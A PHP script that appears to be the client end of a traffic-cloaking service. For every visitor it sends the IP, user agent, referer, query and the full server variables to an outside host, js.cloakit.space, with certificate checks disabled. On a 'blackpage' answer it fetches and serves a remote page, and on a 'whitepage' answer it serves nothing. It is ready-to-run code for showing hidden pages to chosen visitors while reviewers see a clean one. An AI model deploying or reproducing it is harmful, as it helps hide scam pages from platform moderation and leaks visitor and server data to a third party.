<?php
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    header('Access-Control-Allow-Origin: *');
    header('Access-Control-Allow-Methods: POST, GET, DELETE, PUT, PATCH, OPTIONS');
    header('Access-Control-Allow-Headers: token, Content-Type');
    header('Access-Control-Max-Age: 1728000');
    header('Content-Length: 0');
    header('Content-Type: text/plain');
    die();
}

header('Access-Control-Allow-Origin: *');
header('Content-Type: application/json');

$_POST = json_decode(file_get_contents('php://input'), true);

if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {
 $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_CF_CONNECTING_IP'];
}
if ($_SERVER['REMOTE_ADDR']==$_SERVER['SERVER_ADDR']) {
 if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
  $_SERVER['REMOTE_ADDR']=$_SERVER['HTTP_X_FORWARDED_FOR'];
 }
 else if (isset($_SERVER['HTTP_X_REAL_IP'])) {
  $_SERVER['REMOTE_ADDR']=$_SERVER['HTTP_X_REAL_IP'];
 }
}

$Referer = $_POST['ViewerReferer'];
$UserAgent = $_POST['ViewerUserAgent'];
$UrlQuery = $_POST['ViewerUrlQuery'];
$UserIp = $_SERVER['REMOTE_ADDR'];
$user = '8ba83e8c92e4302add834dda548df932';
$company = '33145';

$mainserver = 'https://js.cloakit.space/api.php';
$data = array(
   '_server' => json_encode($_SERVER),
   'user' => $user,
   'company' => $company,
   'ViewerReferer'=>$Referer,
   'ViewerUserAgent'=>$UserAgent,
   'ViewerUrlQuery'=>$UrlQuery,
   'ViewerIP'=>$UserIp
);
$ch = curl_init();
$optArray = array(
    CURLOPT_URL => $mainserver,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_SSL_VERIFYHOST => false,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_CUSTOMREQUEST => 'POST',
    CURLOPT_POSTFIELDS => $data
);
curl_setopt_array($ch, $optArray);
$result = curl_exec($ch);
curl_close($ch);
$result = json_decode($result, true);
$result['ip']=$UserIp;
if ($result['type']=='whitepage') {
  $result=array();
}

if ($result['type']=='blackpage') {
 $arrContextOptions=array(
  'ssl'=>array(
   'verify_peer'=>false,
   'verify_peer_name'=>false,
  ),
  'http' => array(
   'header' => 'User-Agent: '.$result['user_agent']
  )
 );
 
 if(stristr($UrlQuery, '?') != FALSE) {
    $QueryParts = explode('?', $UrlQuery);
	$request_html = $result['page'].'?'.$QueryParts[1];
 }
 else {
	$request_html = $result['page'];
 }
 
 $html = file_get_contents($request_html, false, stream_context_create());
 $html = str_replace('<head>', '<head><base href="'.$result['page'].'" />', $html);

 $result['html']=$html;
}

$result = json_encode($result);

header('Content-type: application/json');
echo $result;
?>